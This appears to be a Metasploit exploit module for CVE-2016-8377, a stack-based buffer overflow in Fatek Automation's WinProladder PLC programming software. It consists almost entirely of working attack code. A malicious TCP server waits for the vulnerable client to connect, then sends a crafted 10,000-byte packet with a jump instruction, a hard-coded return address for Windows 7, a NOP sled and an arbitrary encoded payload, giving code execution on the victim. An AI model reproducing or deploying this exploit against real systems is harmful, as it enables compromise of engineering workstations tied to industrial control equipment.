 
class MetasploitModule < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::Remote::TcpServer
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Fatek Automation PLC WinProladder Stack-based Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a stack based buffer overflow found in Fatek Automation
                PLC WinProladder v3.11 Build 14701. The vulnerability is triggered when a client
                connects to a listening server. The client does not properly sanitize the length
                of the received input prior to placing it on the stack.
            },
            &#039;Author&#039;         => [ &#039;james fitts&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [ &#039;ZDI&#039;, &#039;16-672&#039; ],
                    [ &#039;CVE&#039;, &#039;2016-8377&#039; ],
                    [ &#039;URL&#039;, &#039;https://ics-cert.us-cert.gov/advisories/ICSA-16-350-01&#039; ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 1000,
                    &#039;BadChars&#039; => "\x00\x0a\x0d\x20",
                    &#039;StackAdjustment&#039; => -3500
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [
                        &#039;Windows 7 EN&#039;, 
                            {
                                # CC3250MT.dll
                                # pop ecx/ pop ebp/ retn
                                &#039;Ret&#039; => 0x32514d79
                            } 
                    ],
                ],
            &#039;DefaultTarget&#039; => 0,
            &#039;DisclosureDate&#039; => &#039;Dec 15 2016&#039;))
 
        register_options(
            [
                OptPort.new(&#039;SRVPORT&#039;, [ true, "The port to listen on", 500])
            ], self.class)
    end
 
    def on_client_data(client)
        p = payload.encoded
 
        pkt = "A" * 10000
        pkt[1092, 4] = [0x04eb9090].pack(&#039;V&#039;)   # jmp $+6
        pkt[1096, 4] = [target.ret].pack(&#039;V&#039;)
        pkt[1100, 50] = "\x90" * 50
        pkt[1150, p.length] = p
 
        client.put(pkt)
        handler
        service.close_client(client)
    end
 
end

